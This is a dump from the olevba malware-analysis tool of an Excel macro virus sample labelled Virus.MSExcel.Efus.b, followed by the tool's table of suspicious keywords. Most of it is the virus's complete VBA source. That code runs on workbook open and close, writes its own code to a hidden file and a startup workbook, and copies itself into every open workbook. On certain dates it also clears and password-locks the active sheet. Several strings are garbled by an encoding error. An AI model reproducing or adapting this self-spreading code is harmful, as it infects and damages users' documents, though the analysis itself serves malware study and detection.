olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Efus.b-d0b0490f17c1c5673fc54065c572f0a158f1ae82
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Efus.b-d0b0490f17c1c5673fc54065c572f0a158f1ae82 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Efus.b-d0b0490f17c1c5673fc54065c572f0a158f1ae82 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Efus.b-d0b0490f17c1c5673fc54065c572f0a158f1ae82 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Efus.b-d0b0490f17c1c5673fc54065c572f0a158f1ae82 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SUFE.bas 
in file: Virus.MSExcel.Efus.b-d0b0490f17c1c5673fc54065c572f0a158f1ae82 - OLE stream: '_VBA_PROJECT_CUR/VBA/SUFE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

    Dim Modu
    Dim Infected
    Dim Code
Sub Option_Set()
On Error Resume Next
    With Application
        .UserName = "SUFE"
        .StandardFont = "ЛОМе"
        .StandardFontSize = "12"
        .DefaultFilePath = "C:\My Documents"
        .AltStartupPath = "C:\MS_DOS"
        .EnableSound = False
        .RollZoom = False
    End With
End Sub
Sub Settle_C()
    Dim If_Settled As Boolean
    On Error Resume Next
    With Application.FileSearch
        .LookIn = "C:\MS_DOS"
        .FileName = "Command.dos"
        If .Execute > 0 Then
            If_Settled = True
        End If
    End With
    If If_Settled = True Then
        Application.MacroOptions Macro:="C:\MS_DOS\Command.DOS!Action", Description:="", _
            ShortcutKey:="c"
        Application.OnWindow = "C:\MS_DOS\Command.DOS!Action"
        Call CodeExport
        Exit Sub
    Else
        Call CodeExport
        On Error Resume Next
        MkDir ("c:\MS_DOS")
        Workbooks.Add
        Application.ActiveWorkbook.VBProject.VBComponents.Import ("c:\Ms_IO.sys")
        ActiveWorkbook.SaveAs FileName:="C:\MS_DOS\Command.DOS", FileFormat:=xlNormal
        ActiveWindow.Visible = False
    End If
    Application.MacroOptions Macro:="C:\MS_DOS\Command.DOS!Action", Description:="", _
        ShortcutKey:="c"
    Application.OnWindow = "C:\MS_DOS\Command.DOS!Action"
End Sub

Sub Auto_open()
    On Error Resume Next
    Call Action
End Sub
Sub Auto_close()
    On Error Resume Next
    Call Action
    Application.ActiveWorkbook.Save
End Sub
Sub Action()
    Dim j
    On Error Resume Next
    Application.ScreenUpdating = False
    Call Option_Set
    Call Settle_C
    For j = 1 To Application.Workbooks.Count
        If (Application.Workbooks(j).FullName <> "C:\MS_DOS\Command.DOS" _
            And InStr(Application.Workbooks(j).FullName, "\") <> 0) Then
                Application.Workbooks(j).Activate
                Call CodeImport
        End If
    Next j
    Application.ScreenUpdating = True
    Call Punish
End Sub
Sub CodeExport()
    Dim i
    Dim hFile As Long
    On Error Resume Next
    i = 0
    For Each Modu In Application.VBE.ActiveVBProject.VBComponents
        i = i + 1
        If (Modu.Name = "SUFE") Then
            Code = Application.VBE.ActiveVBProject.VBComponents(i).CodeModule.Lines(1, Application.VBE.ActiveVBProject.VBComponents(i).CodeModule.CountOfLines)
            Code = "Attribute VB_Name = ""SUFE""" & Chr(13) & Code
        Exit For
        End If
    Next Modu
    hFile = FreeFile
    Open "c:\Ms_IO.sys" For Output Access Write As hFile
        Print #hFile, Code
    Close hFile
End Sub
Sub CodeImport()
    On Error Resume Next
    Infected = False
    For Each Modu In Application.ActiveWorkbook.VBProject.VBComponents
        If (Modu.Name = "SUFE") Then
            Infected = True
            Exit For
        End If
    Next Modu
    If Infected = False Then
        Application.ActiveWorkbook.VBProject.VBComponents.Import ("c:\Ms_IO.sys")
        Application.ActiveWorkbook.Save
    End If
End Sub

Sub Punish()
    On Error Resume Next
    If ((Day(Date) = 1) Or (Day(Date) = 20)) And ((WeekDay(Date) = 7) Or (WeekDay(Date) = 1)) Then
        'ґ°Ме
        Application.ActiveWorkbook.Worksheets.Add before:=ActiveWorkbook.Worksheets(1)
        Application.ActiveWorkbook.Worksheets(1).Select
        Range("A1").Select
        Application.DisplayFullScreen = True
        Application.CommandBars("Full Screen").Visible = False
        With ActiveWindow
            .DisplayHeadings = False
            .DisplayOutline = False
            .DisplayZeros = False
            .DisplayHorizontalScrollBar = False
            .DisplayVerticalScrollBar = False
            .DisplayWorkbookTabs = False
            .DisplayGridlines = False
        End With
        ActiveWindow.WindowState = xlMaximized
        '2±іѕ°
        On Error GoTo theEnd
        Range("A1:Q32").Select
        Selection.ClearContents
        Selection.Borders(xlDiagonalDown).LineStyle = xlNone
        Selection.Borders(xlDiagonalUp).LineStyle = xlNone
        Selection.Borders(xlEdgeLeft).LineStyle = xlNone
        Selection.Borders(xlEdgeTop).LineStyle = xlNone
        Selection.Borders(xlEdgeBottom).LineStyle = xlNone
        Selection.Borders(xlEdgeRight).LineStyle = xlNone
        Selection.Borders(xlInsideVertical).LineStyle = xlNone
        Selection.Borders(xlInsideHorizontal).LineStyle = xlNone
        With Selection.Interior
            .ColorIndex = 19
            .Pattern = xlSolid
            .PatternColorIndex = xlAutomatic
        End With
        Selection.RowHeight = 20
        Selection.ColumnWidth = 7
        ActiveWindow.ScrollRow = 12
        Range("A1:a3").Select
        Selection.RowHeight = 10
        Range("A1:c1").Select
        Selection.ColumnWidth = 11
            '3РЎ±іѕ°
        Range("D5:F23").Select
        Selection.Borders(xlDiagonalDown).LineStyle = xlNone
        Selection.Borders(xlDiagonalUp).LineStyle = xlNone
        With Selection.Borders(xlEdgeLeft)
            .LineStyle = xlContinuous
            .Weight = xlThick
            .ColorIndex = 46
        End With
        With Selection.Borders(xlEdgeTop)
            .LineStyle = xlContinuous
            .Weight = xlThick
            .ColorIndex = 46
        End With
        With Selection.Borders(xlEdgeBottom)
            .LineStyle = xlContinuous
            .Weight = xlThick
            .ColorIndex = 46
        End With
        With Selection.Borders(xlEdgeRight)
            .LineStyle = xlContinuous
            .Weight = xlThick
            .ColorIndex = 46
        End With
        Selection.Borders(xlInsideVertical).LineStyle = xlNone
        Selection.Borders(xlInsideHorizontal).LineStyle = xlNone
        Range("D5:F23").Select
        With Selection.Interior
            .ColorIndex = 2
            .Pattern = xlSolid
            .PatternColorIndex = xlAutomatic
        End With
                '4ЧЦМе
        Range("D5:F23").Select
        With Selection.Font
            .Name = "·ВЛО_GB2312"
            .FontStyle = "јУґЦ"
            .Size = 18
            .Strikethrough = False
            .Superscript = False
            .Subscript = False
            .OutlineFont = False
            .Shadow = False
            .Underline = xlUnderlineStyleNone
            .ColorIndex = xlAutomatic
        End With
        Range("D19:D22").Select
        Selection.Font.Size = 14
        Selection.HorizontalAlignment = xlCenter
                'КдИл
        Range("A1").Select
        Range("F8").Select
        ActiveCell.FormulaR1C1 = "ОД"
        Range("F9").Select
        ActiveCell.FormulaR1C1 = "Гч"
        Range("F10").Select
        ActiveCell.FormulaR1C1 = ""
        Range("F11").Select
        ActiveCell.FormulaR1C1 = "·о"
        Range("F12").Select
        ActiveCell.FormulaR1C1 = "ПЧ"
        Range("F13").Select
        ActiveCell.FormulaR1C1 = ""
        Range("F14").Select
        ActiveCell.FormulaR1C1 = ""
        Range("F15").Select
        ActiveCell.FormulaR1C1 = "НЕ"
        Range("F16").Select
        ActiveCell.FormulaR1C1 = "Ѕб"
        Range("F17").Select
        ActiveCell.FormulaR1C1 = ""
        Range("F18").Select
        ActiveCell.FormulaR1C1 = "Ѕш"
        Range("F19").Select
        ActiveCell.FormulaR1C1 = "ИЎ"
        Range("F20").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E6").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E7").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E8").Select
        ActiveCell.FormulaR1C1 = "ЗЪ"
        Range("E9").Select
        ActiveCell.FormulaR1C1 = "·Ь"
        Range("E10").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E11").Select
        ActiveCell.FormulaR1C1 = "СП"
        Range("E12").Select
        ActiveCell.FormulaR1C1 = "Ѕч"
        Range("E13").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E14").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E15").Select
        ActiveCell.FormulaR1C1 = "Зу"
        Range("E16").Select
        ActiveCell.FormulaR1C1 = "Кµ"
        Range("E17").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E18").Select
        ActiveCell.FormulaR1C1 = "ґґ"
        Range("E19").Select
        ActiveCell.FormulaR1C1 = "РВ"
        Range("E20").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E21").Select
        ActiveCell.FormulaR1C1 = ""
        Range("d19").Select
        ActiveCell.FormulaR1C1 = "S"
        Range("D20").Select
        ActiveCell.FormulaR1C1 = "U"
        Range("D21").Select
        ActiveCell.FormulaR1C1 = "F"
        Range("D22").Select
        ActiveCell.FormulaR1C1 = "E"
        Range("A1").Select
        ActiveSheet.Protect Password:="We11come", DrawingObjects:=True, Contents:=True, Scenarios:=True
theEnd:
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Base64    |IAD                 |SUFE                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+
